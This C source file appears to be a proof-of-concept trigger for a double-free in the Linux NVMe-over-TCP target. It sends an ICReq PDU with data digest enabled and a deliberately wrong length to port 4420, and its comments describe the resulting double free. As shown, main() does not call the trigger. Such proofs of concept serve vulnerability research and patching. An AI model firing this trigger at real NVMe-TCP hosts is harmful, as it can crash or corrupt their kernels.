#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/xattr.h>
#include <assert.h>
#include <sys/syscall.h>

#include <sys/resource.h>

#include <sys/mman.h>
#include <sys/prctl.h>

#include <sys/msg.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <fcntl.h>
#include <sys/stat.h>

#include <sys/xattr.h>
#include <sys/param.h>
#include <pthread.h>

#include "pdu.h"
#include "crc32c.h"

#define NVME_SERVER_IP      "0.0.0.0"
#define NVME_SERVER_PORT    4420

#define NUM_CONNECTIONS     10000

#define EXIT_ON_ERR(cond) \
    if (cond) { \
        perror(#cond); \
        exit(1); \
    }

static struct sockaddr_in serv_addr;
static struct sockaddr_in construct_serv_addr();
static void trigger_bug();
static struct nvme_tcp_icreq_pdu construct_icreq_pdu(int digest_needed);

int main() {
    setbuf(stdout, NULL);
    serv_addr = construct_serv_addr();
    return 0;
}

static struct nvme_tcp_icreq_pdu construct_icreq_pdu(int digest_needed) {
    struct nvme_tcp_icreq_pdu icreq = {
            .hdr.type = nvme_tcp_icreq,
            .hdr.flags = 0,
            .hdr.hlen = 0x80,
            .hdr.pdo = 0,
            .hdr.plen = 0x80, // correct
            .pfv = 0,
            .hpda = 0,
            .digest = digest_needed, // enable data digest for alloc_crypto
            .maxr2t = 0,
    };
    memset(icreq.rsvd2, 0x0, sizeof(icreq.rsvd2));
    return icreq;
}

static struct sockaddr_in construct_serv_addr() {
    struct sockaddr_in serv_addr = {
        .sin_port = htons(NVME_SERVER_PORT),
        .sin_family = AF_INET,
        .sin_addr.s_addr = inet_addr(NVME_SERVER_IP),
    };
    return serv_addr;
}

static void trigger_bug() {
    struct nvme_tcp_icreq_pdu wrong_icreq = construct_icreq_pdu(2);
    wrong_icreq.hdr.plen = 0xff; // wrong to trigger bug
    memset(wrong_icreq.rsvd2, 0x0, sizeof(wrong_icreq.rsvd2));
    
    int df_sockfd;
    EXIT_ON_ERR((df_sockfd = socket(PF_INET, SOCK_STREAM, 0)) < 0);
    
    // ONLY TCP-connection (no rcv_hash/snd_hash/crypto_tfm allocation happens here)
    EXIT_ON_ERR(connect(df_sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0); 

    puts("[*] sending wrong_icreq");
    // alloc crypto_tfm,snd_hash,rcv_hash and free them 2 times (we have some time between these 2 frees)
    send(df_sockfd, &wrong_icreq, sizeof(wrong_icreq), 0);

    struct nvme_tcp_icresp_pdu icresp;
    EXIT_ON_ERR(recv(df_sockfd, &icresp, sizeof(icresp), 0) < 0);
}
